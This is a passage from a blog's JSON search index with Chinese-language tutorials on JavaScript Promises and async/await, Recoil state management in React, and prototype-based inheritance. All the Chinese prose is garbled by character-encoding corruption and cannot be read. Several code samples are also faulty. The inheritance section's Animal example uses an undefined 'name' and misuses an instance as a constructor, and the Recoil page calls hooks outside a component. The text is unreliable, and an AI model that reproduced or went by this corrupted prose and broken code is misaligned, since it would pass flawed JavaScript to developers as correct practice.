åˆå§‹çŠ¶æ€ï¼Œæ—¢æ²¡æœ‰è¢«å…‘ç°ï¼Œä¹Ÿæ²¡æœ‰è¢«æ‹’ç»ã€‚ å·²å…‘ç°ï¼ˆfulfilledï¼‰: æ„å‘³ç€æ“ä½œæˆåŠŸå®Œæˆã€‚ å·²æ‹’ç»ï¼ˆrejectedï¼‰: æ„å‘³ç€æ“ä½œå¤±è´¥ã€‚  #. Promise æœ‰ 2 ä¸ªæ–¹æ³•  Promise.prototype.then Promise.prototype.catch  å½“ç„¶ï¼Œå°±åƒå¸¸è§„ try {...} catch {...} ä¸­çš„ finally å­å¥ä¸€æ ·ï¼Œpromise ä¸­ä¹Ÿæœ‰ finallyã€‚\nfinally æ˜¯æ‰§è¡Œæ¸…ç†ï¼ˆcleanupï¼‰çš„å¾ˆå¥½çš„å¤„ç†ç¨‹åºï¼ˆhandlerï¼‰ï¼Œä¾‹å¦‚æ— è®ºç»“æœå¦‚ä½•ï¼Œéƒ½åœæ­¢ä½¿ç”¨ä¸å†éœ€è¦çš„åŠ è½½æŒ‡ç¤ºç¬¦ï¼ˆindicatorï¼‰\n1 2 3 4 5 6 7 8  new Promise((resolve, reject) =\u0026gt; { /* åšä¸€äº›éœ€è¦æ—¶é—´çš„äº‹å„¿ï¼Œç„¶åè°ƒç”¨ resolve/reject */ }) // åœ¨ promise ä¸º settled æ—¶è¿è¡Œï¼Œæ— è®ºæˆåŠŸä¸å¦  .finally(() =\u0026gt; stop loading indicator) // æ‰€ä»¥ï¼ŒåŠ è½½æŒ‡ç¤ºå™¨ï¼ˆloading indicatorï¼‰å§‹ç»ˆä¼šåœ¨æˆ‘ä»¬å¤„ç†ç»“æœ/é”™è¯¯ä¹‹å‰åœæ­¢  .then(result =\u0026gt; show result, err =\u0026gt; show error)   #. Promise æœ‰ 2 ä¸ªå‚æ•°  resolve(value) â€” å¦‚æœä»»åŠ¡æˆåŠŸå®Œæˆå¹¶å¸¦æœ‰ç»“æœ valueã€‚ reject(error) â€” å¦‚æœå‡ºç°äº† errorï¼Œerror å³ä¸º error å¯¹è±¡ã€‚  äºŒã€Promise ä½¿ç”¨æ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // åˆ›å»ºPromise let myPromise = new Promise((myResolve, myReject) =\u0026gt; { myResolve(); // when successful  myReject(); // when error }); // ä½¿ç”¨Promise myPromise.then( function (value) { /* code if successful */ }, function (error) { /* code if some error */ } );   å®ä¾‹\n1 2 3 4 5 6 7 8 9 10 11  new Promise((res, rej) =\u0026gt; { setTimeout(() =\u0026gt; res(1), 1000); }) .then((res) =\u0026gt; { console.log(res); // 1  return res * 2; }) .then((res) =\u0026gt; { console.log(res); // 2  });   ä¸‰ã€async/await  ç®€å•æ¥è¯´ï¼Œå®ƒä»¬æ˜¯åŸºäº promises çš„è¯­æ³•ç³–ï¼Œä½¿å¼‚æ­¥ä»£ç æ›´æ˜“äºç¼–å†™å’Œé˜…è¯»ã€‚ é€šè¿‡ä½¿ç”¨å®ƒä»¬ï¼Œå¼‚æ­¥ä»£ç çœ‹èµ·æ¥æ›´åƒæ˜¯è€å¼åŒæ­¥ä»£ç ã€‚ ï¼ï¼ï¼è¿™æ‰æ˜¯æ‰€æœ‰å›è°ƒçš„æœ€ä½³ï¼ˆè‡³å°‘ç›®å‰æ¥è¯´ï¼‰ä½¿ç”¨æ–¹å¼ï¼ï¼ï¼  #. function ä¸­çš„ä½¿ç”¨æ–¹æ³• 1 2 3 4 5 6  (async () =\u0026gt; { let response = await fetch(\u0026#39;/article/promise-chaining/user.json\u0026#39;); let user = await response.json(); ... })();   #. class ä¸­çš„ä½¿ç”¨æ–¹æ³• 1 2 3 4 5 6 7 8 9 10  class Waiter { async wait() { return await Promise.resolve(1); } } new Waiter() .wait() .then(alert); // 1ï¼ˆalert ç­‰åŒäº result =\u0026gt; alert(result)ï¼‰   ","description":"Promise å¯¹è±¡ç”¨äºè¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„æœ€ç»ˆå®Œæˆ (æˆ–å¤±è´¥)åŠå…¶ç»“æœå€¼ã€‚","id":76,"section":"javascript","tags":null,"title":"Promise, async/await","uri":"https://codthing.github.io/javascript/function/promise/"},{"content":"Recoil æ˜¯ React å®˜æ–¹ meta (facebook) å®˜æ–¹å®éªŒå®¤çš„çŠ¶æ€ç®¡ç†åº“ï¼Œè´´åˆ React hooksï¼Œè‡ªç”±åº¦å¾ˆé«˜ï¼Œæ‰€ä»¥è¦åœ¨é¡¹ç›®ä¸­åšä¸€äº›è§„èŒƒï¼Œä»¥ä¾¿æä¾›æœ€ä½³çš„å®è·µã€‚\nå®˜æ–¹æ–‡æ¡£æœ‰å¯¹æ ¸å¿ƒæ¦‚å¿µçš„è§£é‡Šï¼Œä½†æ˜¯ï¼Œè¿™é‡Œä¸»è¦ä»¥æˆ‘ä¸ªäººçš„ç†è§£å»è¯ é‡Šè¿™äº›æ ¸å¿ƒæ¦‚å¿µã€‚\natom æ˜¯ Recoil çš„æ ¸å¿ƒæ¦‚å¿µï¼Œåœ¨é¡¹ç›®ä¸­ï¼Œä¸»è¦å°†å®ƒç”¨æ¥åˆå§‹åŒ–ä¸€ä¸ªçŠ¶æ€ã€‚é‚£å¦‚ä½•å¤„ç†è¿™ä¸ªçŠ¶æ€å‘¢ï¼ŒselectorFamily å°±åƒä¸€é¢é•œå­ï¼Œå®ƒå¯ä»¥æŠ˜å°„ atom çš„çŠ¶æ€ç»™ç»„ä»¶(å½“ç„¶ï¼Œè¿™é‡Œæœ€å¥½å°±æ˜¯ç›´æ¥ä»atomè¯»å–çŠ¶æ€)ï¼Œä¹Ÿå¯ä»¥å°†ç»„ä»¶æƒ³è¦æ”¹å˜çš„çŠ¶æ€æ„å›¾é€šè¿‡å®ƒæ¥æŠ˜å°„ç»™ atomã€‚\næœ€ä½³ç›®å½•ç»“æ„ /pages/index.tsx\r/components/plus.component.tsx\r/components/minus.component.tsx\r/components/reset.component.tsx\r/recoil/count.recoil.ts /recoil/count.recoil.ts import {\ratom,\rDefaultValue,\rselectorFamily,\r} from \u0026#39;recoil\u0026#39;;\rconst count = atom({\rkey: \u0026#39;count\u0026#39;,\rdefault: 0\r});\rconst changeCount = selectorFamily({\rkey: \u0026#39;changeCount\u0026#39;,\rget: () =\u0026gt; ({ get }) =\u0026gt; { return get(count) },\rset: (params) =\u0026gt; ({ set }, newValue: any) =\u0026gt; {\rswitch (params) {\rcase \u0026#39;+\u0026#39;:\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue + 1)\r);\rbreak;\rcase \u0026#39;-\u0026#39;:\rif (newValue \u0026gt;= 1) {\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue - 1)\r)\r};\rbreak;\rdefault: set(\rcount,\rnewValue\r);\r};\r}\r});\rexport { count, changeCount }; /pages/index.tsx import Plus from \u0026#39;../components/plus.component\u0026#39;;\rimport Minus from \u0026#39;../components/minus.component\u0026#39;;\rimport CountReset from \u0026#39;../components/countReset.component\u0026#39;;\rimport { useRecoilState, useRecoilValue, useResetRecoilState } from \u0026#39;recoil\u0026#39;;\rimport { changeCount, count } from \u0026#39;../recoil/count.recoil\u0026#39;;\rconst value = useRecoilValue(count);\rconst [plusCount, setPlusCount] = useRecoilState(changeCount(\u0026#39;+\u0026#39;));\rconst plusFunc = () =\u0026gt; setPlusCount(plusCount);\rconst [minusCount, setMinusCount] = useRecoilState(changeCount(\u0026#39;-\u0026#39;));\rconst minusFunc = () =\u0026gt; setMinusCount(minusCount);\rconst resetFunc = useResetRecoilState(changeCount(\u0026#39;\u0026#39;));\r\u0026lt;h1\u0026gt;{value}\u0026lt;/h1\u0026gt;\r\u0026lt;Plus plusFunc={plusFunc} /\u0026gt;\r\u0026lt;Minus minusFunc={minusFunc} /\u0026gt;\r\u0026lt;CountReset resetFunc={resetFunc} /\u0026gt; /components/plus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.plusFunc}\u0026gt;+\u0026lt;/button\u0026gt;\r)\r} /component/minus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.minusFunc}\u0026gt;-\u0026lt;/button\u0026gt;\r)\r} /components/resetCount.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.resetFunc}\u0026gt;reset\u0026lt;/button\u0026gt;\r)\r} ","description":"React å®˜æ–¹å®éªŒå®¤çš„çŠ¶æ€ç®¡ç†è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰å¹¶ä¸å¦‚ç¤¾åŒºä¸­çš„Zustandå¥½ç”¨","id":77,"section":"react","tags":null,"title":"Recoil æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react/recoil/recoil-bp/"},{"content":"ä¸€ã€äº†è§£è‡ªæœ‰å±æ€§  hasOwnProperty  ä¸‹é¢çš„å®ä¾‹ï¼ŒBird æ„é€ å‡½æ•°å®šä¹‰äº†ä¸¤ä¸ªå±æ€§ï¼šname å’Œ numLegsï¼š\n1 2 3 4 5 6 7 8  function Bird(name) { this.name = name; this.numLegs = 2; } let duck = new Bird(\u0026#34;Donald\u0026#34;); let canary = new Bird(\u0026#34;Tweety\u0026#34;);   name å’Œ numLegs è¢«å«åš è‡ªèº«å±æ€§ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ç›´æ¥åœ¨å®ä¾‹å¯¹è±¡ä¸Šå®šä¹‰çš„ã€‚\nè¿™å°±æ„å‘³ç€ duck å’Œ canary è¿™ä¸¤ä¸ªå¯¹è±¡åˆ†åˆ«æ‹¥æœ‰è¿™äº›å±æ€§çš„ç‹¬ç«‹å‰¯æœ¬ã€‚\näº‹å®ä¸Šï¼ŒBird çš„æ‰€æœ‰å®ä¾‹éƒ½å°†æ‹¥æœ‰è¿™äº›å±æ€§çš„ç‹¬ç«‹å‰¯æœ¬ã€‚\nä¸‹é¢çš„ä»£ç å°† duck çš„æ‰€æœ‰è‡ªèº«å±æ€§éƒ½å­˜åˆ°ä¸€ä¸ªå«ä½œ ownProps çš„æ•°ç»„é‡Œé¢ï¼š\n1 2 3 4 5 6 7 8 9 10  let ownProps = []; for (let property in duck) { if(duck.hasOwnProperty(property)) { ownProps.push(property); } } console.log(ownProps); // [\u0026#34;name\u0026#34;, \u0026#34;numLegs\u0026#34;]   \räºŒã€ä½¿ç”¨åŸå‹å±æ€§æ¥å‡å°‘é‡å¤ä»£ç  æ‰€æœ‰ Bird å®ä¾‹å¯èƒ½ä¼šæœ‰ç›¸åŒçš„ numLegs å€¼ï¼Œ\næ‰€ä»¥åœ¨æ¯ä¸€ä¸ª Bird çš„å®ä¾‹ä¸­æœ¬è´¨ä¸Šéƒ½æœ‰ä¸€ä¸ªé‡å¤çš„å˜é‡ numLegsã€‚\nå½“åªæœ‰ä¸¤ä¸ªå®ä¾‹æ—¶å¯èƒ½å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œä½†æƒ³è±¡ä¸€ä¸‹å¦‚æœæœ‰æ•°ç™¾ä¸‡ä¸ªå®ä¾‹ã€‚ è¿™å°†ä¼šäº§ç”Ÿè®¸è®¸å¤šå¤šé‡å¤çš„å˜é‡ã€‚\næ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Bird çš„ prototypeã€‚\nprototype æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨æ‰€æœ‰ Bird å®ä¾‹ä¹‹é—´å…±äº«çš„å¯¹è±¡ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªåœ¨ Bird prototype ä¸­æ·»åŠ  numLegs å±æ€§çš„ç¤ºä¾‹ï¼š\n1 2  Bird.prototype.numLegs = 2;   ç°åœ¨æ‰€æœ‰çš„ Bird å®ä¾‹éƒ½æ‹¥æœ‰äº†å…±åŒçš„ numLegs å±æ€§å€¼ã€‚\n1 2 3  console.log(duck.numLegs); // 2 console.log(canary.numLegs); // 2   ç”±äºæ‰€æœ‰çš„å®ä¾‹éƒ½å¯ä»¥ç»§æ‰¿ prototype ä¸Šçš„å±æ€§ï¼Œæ‰€ä»¥å¯ä»¥æŠŠ prototype çœ‹ä½œæ˜¯åˆ›å»ºå¯¹è±¡çš„ \u0026ldquo;é…æ–¹\u0026rdquo;ã€‚\nè¯·æ³¨æ„ï¼šduck å’Œ canary çš„ prototype å±äº Bird çš„æ„é€ å‡½æ•°ï¼Œå³ Bird çš„åŸå‹ Bird.prototypeã€‚\nJavaScript ä¸­å‡ ä¹æ‰€æœ‰çš„å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼Œè¿™ä¸ªå±æ€§æ˜¯å±äºå®ƒæ‰€åœ¨çš„æ„é€ å‡½æ•°ã€‚\n\rä¸‰ã€è¿­ä»£æ‰€æœ‰å±æ€§ ç°åœ¨å·²ç»äº†è§£äº†ä¸¤ç§å±æ€§: è‡ªèº«å±æ€§ å’Œ prototype å±æ€§ã€‚\nè‡ªèº«å±æ€§æ˜¯ç›´æ¥åœ¨å¯¹è±¡ä¸Šå®šä¹‰çš„ã€‚ è€ŒåŸå‹å±æ€§åœ¨ prototype ä¸Šå®šä¹‰ã€‚\n1 2 3 4 5 6 7 8  function Bird(name) { this.name = name; //own property } Bird.prototype.numLegs = 2; // prototype property  let duck = new Bird(\u0026#34;Donald\u0026#34;);   è¿™ä¸ªç¤ºä¾‹ä¼šå‘Šè¯‰ä½ å¦‚ä½•å°† duck çš„ è‡ªèº«å±æ€§ å’Œ prototype å±æ€§åˆ†åˆ«æ·»åŠ åˆ° ownProps æ•°ç»„å’Œ prototypeProps æ•°ç»„é‡Œé¢ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let ownProps = []; let prototypeProps = []; for (let property in duck) { if(duck.hasOwnProperty(property)) { ownProps.push(property); } else { prototypeProps.push(property); } } console.log(ownProps); // [ \u0026#39;name\u0026#39; ] console.log(prototypeProps); // [ \u0026#39;numLegs\u0026#39; ]   \rå››ã€äº†è§£æ„é€ å‡½æ•°å±æ€§ ä¸Šä¾‹åˆ›å»ºçš„å®ä¾‹å¯¹è±¡ duck å’Œ beagle éƒ½æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ constructor å±æ€§ï¼š\n1 2 3 4 5 6  let duck = new Bird(); let beagle = new Dog(); console.log(duck.constructor === Bird); // true console.log(beagle.constructor === Dog); // true   éœ€è¦æ³¨æ„åˆ°çš„æ˜¯è¿™ä¸ª constructor å±æ€§æ˜¯å¯¹åˆ›å»ºè¿™ä¸ªå®ä¾‹çš„æ„é€ å‡½æ•°çš„ä¸€ä¸ªå¼•ç”¨ã€‚\nconstructor å±æ€§çš„ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥é€šè¿‡æ£€æŸ¥è¿™ä¸ªå±æ€§æ¥æ‰¾å‡ºå®ƒæ˜¯ä¸€ä¸ªä»€ä¹ˆå¯¹è±¡ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæ¥çœ‹çœ‹æ˜¯æ€ä¹ˆä½¿ç”¨çš„ï¼š\n1 2 3 4 5 6 7 8  function joinBirdFraternity(candidate) { if (candidate.constructor === Bird) { return true; } else { return false; } }   æ³¨æ„ï¼š ç”±äº constructor å±æ€§å¯ä»¥è¢«é‡å†™ï¼Œæ‰€ä»¥æœ€å¥½ä½¿ç”¨ instanceof æ–¹æ³•æ¥æ£€æŸ¥å¯¹è±¡çš„ç±»å‹ã€‚\n\räº”ã€å°†åŸå‹æ›´æ”¹ä¸ºæ–°å¯¹è±¡ å•ç‹¬ç»™ prototype æ·»åŠ å±æ€§ï¼š\n1 2  Bird.prototype.numLegs = 2;   éœ€è¦æ·»åŠ å¤šä¸ªå±æ€§çš„ï¼Œè¿™æœªå…ä¼šæ˜¾å¾—æ‹–æ²“ã€‚\n1 2 3 4 5 6 7 8  Bird.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); } Bird.prototype.describe = function() { console.log(\u0026#34;My name is \u0026#34; + this.name); }   ä¸€ç§æ›´æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯ç»™å¯¹è±¡çš„ prototype è®¾ç½®ä¸ºä¸€ä¸ªå·²ç»åŒ…å«äº†å±æ€§çš„æ–°å¯¹è±¡ã€‚\nè¿™æ ·ä¸€æ¥ï¼Œæ‰€æœ‰å±æ€§éƒ½å¯ä»¥ä¸€æ¬¡æ€§æ·»åŠ è¿›æ¥ï¼š\n1 2 3 4 5 6 7 8 9 10  Bird.prototype = { numLegs: 2, eat: function() { console.log(\u0026#34;nom nom nom\u0026#34;); }, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   \rå…­ã€æ›´æ”¹åŸå‹æ—¶ï¼Œè®°å¾—è®¾ç½®æ„é€ å‡½æ•°å±æ€§ æ‰‹åŠ¨è®¾ç½®ä¸€ä¸ªæ–°å¯¹è±¡çš„åŸå‹æœ‰ä¸€ä¸ªé‡è¦çš„å‰¯ä½œç”¨ã€‚\nå®ƒæ¸…é™¤äº† constructor å±æ€§ï¼\næ­¤å±æ€§å¯ä»¥ç”¨æ¥æ£€æŸ¥æ˜¯å“ªä¸ªæ„é€ å‡½æ•°åˆ›å»ºäº†å®ä¾‹ï¼Œä½†ç”±äºè¯¥å±æ€§å·²è¢«è¦†ç›–ï¼Œå®ƒç°åœ¨ç»™å‡ºäº†é”™è¯¯çš„ç»“æœï¼š\n1 2 3 4  duck.constructor === Bird; // false duck.constructor === Object; // true duck instanceof Bird; // true   ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‡¡æ˜¯æ‰‹åŠ¨ç»™æ–°å¯¹è±¡é‡æ–°è®¾ç½®è¿‡åŸå‹å¯¹è±¡çš„ï¼Œéƒ½åˆ«å¿˜è®°åœ¨åŸå‹å¯¹è±¡ä¸­å®šä¹‰ä¸€ä¸ª constructor å±æ€§ï¼š\n1 2 3 4 5 6 7 8 9 10 11  Bird.prototype = { constructor: Bird, numLegs: 2, eat: function() { console.log(\u0026#34;nom nom nom\u0026#34;); }, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   \rä¸ƒã€äº†è§£å¯¹è±¡çš„åŸå‹æ¥è‡ªå“ªé‡Œ å°±åƒäººä»¬ä»çˆ¶æ¯é‚£é‡Œç»§æ‰¿åŸºå› ä¸€æ ·ï¼Œå¯¹è±¡ä¹Ÿå¯ç›´æ¥ä»åˆ›å»ºå®ƒçš„æ„é€ å‡½æ•°é‚£é‡Œç»§æ‰¿å…¶ prototypeã€‚\nè¯·çœ‹ä¸‹é¢çš„ä¾‹å­ï¼šBird æ„é€ å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª duck å¯¹è±¡ï¼š\n1 2 3 4 5 6  function Bird(name) { this.name = name; } let duck = new Bird(\u0026#34;Donald\u0026#34;);   duck ä» Bird æ„é€ å‡½æ•°é‚£é‡Œç»§æ‰¿äº†å®ƒçš„ prototypeã€‚\nä½ å¯ä»¥ä½¿ç”¨ isPrototypeOf æ–¹æ³•æ¥éªŒè¯ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼š\n1 2  Bird.prototype.isPrototypeOf(duck); // true   å…«ã€äº†è§£åŸå‹é“¾ JavaScript ä¸­æ‰€æœ‰çš„å¯¹è±¡ï¼ˆé™¤äº†å°‘æ•°ä¾‹å¤–ï¼‰éƒ½æœ‰è‡ªå·±çš„ prototypeã€‚\nè€Œä¸”ï¼Œå¯¹è±¡çš„ prototype æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚\n1 2 3 4 5 6  function Bird(name) { this.name = name; } typeof Bird.prototype; // object   æ­£å› ä¸º prototype æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥ prototype å¯¹è±¡ä¹Ÿæœ‰å®ƒè‡ªå·±çš„ prototypeï¼\nè¿™æ ·çœ‹æ¥çš„è¯ï¼ŒBird.prototype çš„ prototype å°±æ˜¯ Object.prototypeï¼š\n1 2  Object.prototype.isPrototypeOf(Bird.prototype); // true   è¿™æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ\n1 2 3  let duck = new Bird(\u0026#34;Donald\u0026#34;); duck.hasOwnProperty(\u0026#34;name\u0026#34;);   hasOwnProperty æ˜¯å®šä¹‰åœ¨ Object.prototype ä¸Šçš„ä¸€ä¸ªæ–¹æ³•ï¼Œ\nå°½ç®¡åœ¨ Bird.prototype å’Œ duckä¸Šå¹¶æ²¡æœ‰å®šä¹‰è¯¥æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åœ¨è¿™ä¸¤ä¸ªå¯¹è±¡ä¸Šè®¿é—®åˆ°ã€‚\nè¿™å°±æ˜¯ prototype é“¾çš„ä¸€ä¸ªä¾‹å­ã€‚\nåœ¨è¿™ä¸ª prototype é“¾ä¸­ï¼ŒBird æ˜¯ duck çš„ supertypeï¼Œè€Œ duck æ˜¯ subtypeã€‚\nObject åˆ™æ˜¯ Bird å’Œ duck å®ä¾‹å…±åŒçš„ supertypeã€‚\nObject æ˜¯ JavaScript ä¸­æ‰€æœ‰å¯¹è±¡çš„ supertypeï¼Œä¹Ÿå°±æ˜¯åŸå‹é“¾çš„æœ€é¡¶å±‚ã€‚\nå› æ­¤ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥è®¿é—® hasOwnProperty æ–¹æ³•ã€‚\n\råã€ä½¿ç”¨ç»§æ‰¿é¿å…é‡å¤ æœ‰ä¸€æ¡åŸåˆ™å«åšï¼šDon\u0026rsquo;t Repeat Yourselfã€‚\nå¸¸ä»¥ç¼©å†™å½¢å¼ DRY å‡ºç°ï¼Œæ„æ€æ˜¯â€œä¸è¦è‡ªå·±é‡å¤â€ã€‚\nç¼–å†™é‡å¤ä»£ç ä¼šäº§ç”Ÿçš„é—®é¢˜æ˜¯ï¼šä»»ä½•æ”¹å˜éƒ½éœ€è¦å»å¤šä¸ªåœ°æ–¹ä¿®å¤æ‰€æœ‰é‡å¤çš„ä»£ç ã€‚\nè¿™é€šå¸¸æ„å‘³ç€æˆ‘ä»¬éœ€è¦åšæ›´å¤šçš„å·¥ä½œï¼Œä¼šäº§ç”Ÿæ›´é«˜çš„å‡ºé”™ç‡ã€‚\nè¯·è§‚å¯Ÿä¸‹é¢çš„ç¤ºä¾‹ï¼ŒBird å’Œ Dog å…±äº« describe æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Bird.prototype = { constructor: Bird, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } }; Dog.prototype = { constructor: Dog, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   æˆ‘ä»¬å¯ä»¥çœ‹åˆ° describe æ–¹æ³•åœ¨ä¸¤ä¸ªåœ°æ–¹é‡å¤å®šä¹‰äº†ã€‚\næ ¹æ®ä»¥ä¸Šæ‰€è¯´çš„ DRY åŸåˆ™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª Animal supertypeï¼ˆæˆ–è€…çˆ¶ç±»ï¼‰æ¥é‡å†™è¿™æ®µä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10  function Animal(name) { }; Animal.prototype = { constructor: Animal, name: name, describe: function() { console.log(\u0026#34;My name is \u0026#34; + this.name); } };   Animal æ„é€ å‡½æ•°ä¸­å®šä¹‰äº† describe æ–¹æ³•ï¼Œå¯å°† Bird å’Œ Dog è¿™ä¸¤ä¸ªæ„é€ å‡½æ•°çš„æ–¹æ³•åˆ é™¤æ‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11  let Bird = new Animal() let Dog = new Animal() Bird.prototype = { constructor: Bird }; Dog.prototype = { constructor: Dog };   \råä¸€ã€ä»è¶…ç±»ç»§æ‰¿è¡Œä¸º åˆ›å»ºä¸€ä¸ªè¶…ç±» supertypeï¼ˆæˆ–è€…å«çˆ¶ç±»ï¼‰çš„å®ä¾‹\n1 2 3 4 5  function Animal() { } Animal.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); };   1 2  let animal = new Animal();   æ­¤è¯­æ³•ç”¨äºç»§æ‰¿æ—¶ä¼šå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼Œå¤ªå¤æ‚äº†animal.prototype = {constructor: animal}ã€‚\nç›¸åï¼Œå¦å¤–ä¸€ç§æ²¡æœ‰è¿™äº›ç¼ºç‚¹çš„æ–¹æ³•æ¥æ›¿ä»£ new æ“ä½œï¼š\n1 2  let animal = Object.create(Animal.prototype);   Object.create(obj) åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº† obj ä½œä¸ºæ–°å¯¹è±¡çš„ prototypeã€‚\nå›å¿†ä¸€ä¸‹ï¼Œä¹‹å‰è¯´è¿‡ prototype å°±åƒæ˜¯åˆ›å»ºå¯¹è±¡çš„â€œé…æ–¹â€ã€‚\nå¦‚æœæŠŠ animal çš„ prototype è®¾ç½®ä¸ºä¸ Animal æ„é€ å‡½æ•°çš„ prototype ä¸€æ ·ï¼Œ\né‚£ä¹ˆå°±ç›¸å½“äºè®© animal è¿™ä¸ªå®ä¾‹å…·æœ‰ä¸ Animal çš„å…¶ä»–å®ä¾‹ç›¸åŒçš„â€œé…æ–¹â€äº†ã€‚\n1 2 3  animal.eat(); // nom nom nom animal instanceof Animal; // true   \råäºŒã€å°†å­è¾ˆçš„åŸå‹è®¾ç½®ä¸ºçˆ¶è¾ˆçš„å®ä¾‹ ç»™å­ç±»å‹ï¼ˆæˆ–è€…å­ç±»ï¼‰è®¾ç½® prototypeã€‚ è¿™æ ·ä¸€æ¥ï¼ŒBird å°±æ˜¯ Animal çš„ä¸€ä¸ªå®ä¾‹äº†\n1 2  Bird.prototype = Object.create(Animal.prototype);   è¯·è®°ä½ï¼Œprototype ç±»ä¼¼äºåˆ›å»ºå¯¹è±¡çš„â€œé…æ–¹â€ã€‚ ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼ŒBird å¯¹è±¡çš„é…æ–¹åŒ…å«äº† Animal çš„æ‰€æœ‰å…³é”®â€œæˆåˆ†â€ã€‚\n1 2 3  let duck = new Bird(\u0026#34;Donald\u0026#34;); duck.eat();   duck ç»§æ‰¿äº†Animal çš„æ‰€æœ‰å±æ€§ï¼Œå…¶ä¸­åŒ…æ‹¬äº† eat æ–¹æ³•ã€‚\n\råä¸‰ã€é‡ç½®ä¸€ä¸ªç»§æ‰¿çš„æ„é€ å‡½æ•°å±æ€§ å½“ä¸€ä¸ªå¯¹è±¡ä»å¦ä¸€ä¸ªå¯¹è±¡é‚£é‡Œç»§æ‰¿äº†å…¶ prototype æ—¶ï¼Œé‚£å®ƒä¹Ÿç»§æ‰¿äº†çˆ¶ç±»çš„ constructor å±æ€§ã€‚\n1 2 3 4 5  function Bird() { } Bird.prototype = Object.create(Animal.prototype); let duck = new Bird(); duck.constructor   ä½†æ˜¯ duck å’Œå…¶ä»–æ‰€æœ‰ Bird çš„å®ä¾‹éƒ½åº”è¯¥è¡¨æ˜å®ƒä»¬æ˜¯ç”± Bird åˆ›å»ºçš„ï¼Œè€Œä¸æ˜¯ç”± Animal åˆ›å»ºçš„ã€‚\nä¸ºæ­¤ï¼Œå¯ä»¥æ‰‹åŠ¨å°† Bird çš„æ„é€ å‡½æ•°å±æ€§è®¾ç½®ä¸º Bird å¯¹è±¡ï¼š\n1 2 3 4  Bird.prototype.constructor = Bird; let duck = new Bird(); duck.constructor // [Function: Bird]   \råå››ã€ç»§æ‰¿åæ·»åŠ æ–¹æ³• ä»è¶…ç±»æ„é€ å‡½æ•°ç»§æ‰¿å…¶ prototype å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œé™¤äº†ç»§æ‰¿çš„æ–¹æ³•å¤–ï¼Œè¿˜å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„æ–¹æ³•ã€‚\nBird æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒç»§æ‰¿äº† Animal çš„ prototypeï¼š\n1 2 3 4 5 6 7 8  function Animal() { } Animal.prototype.eat = function() { console.log(\u0026#34;nom nom nom\u0026#34;); }; function Bird() { } Bird.prototype = Object.create(Animal.prototype); // {} Bird.prototype.constructor = Bird; // [Function: Bird]   é™¤äº†ä» Animal æ„é€ å‡½æ•°ç»§æ‰¿çš„è¡Œä¸ºä¹‹å¤–ï¼Œè¿˜éœ€è¦ç»™ Bird å¯¹è±¡æ·»åŠ å®ƒç‹¬æœ‰çš„è¡Œä¸ºã€‚\nè¿™é‡Œï¼Œæˆ‘ä»¬ç»™ Bird å¯¹è±¡æ·»åŠ ä¸€ä¸ª fly() å‡½æ•°ã€‚\nå‡½æ•°ä¼šä»¥ä¸€ç§ä¸å…¶ä»–æ„é€ å‡½æ•°ç›¸åŒçš„æ–¹å¼æ·»åŠ åˆ° Bird\u0026rsquo;s çš„ prototype ä¸­ï¼š\n1 2 3 4  Bird.prototype.fly = function() { console.log(\u0026#34;I\u0026#39;m flying!\u0026#34;); };   ç°åœ¨ Bird çš„å®ä¾‹ä¸­å°±æœ‰äº† eat() å’Œ fly() è¿™ä¸¤ä¸ªæ–¹æ³•ï¼š\n1 2 3 4  let duck = new Bird(); duck.eat(); // nom nom nom duck.fly(); // I\u0026#39;m flying!   \råäº”ã€é‡å†™ç»§æ‰¿æ–¹æ³• 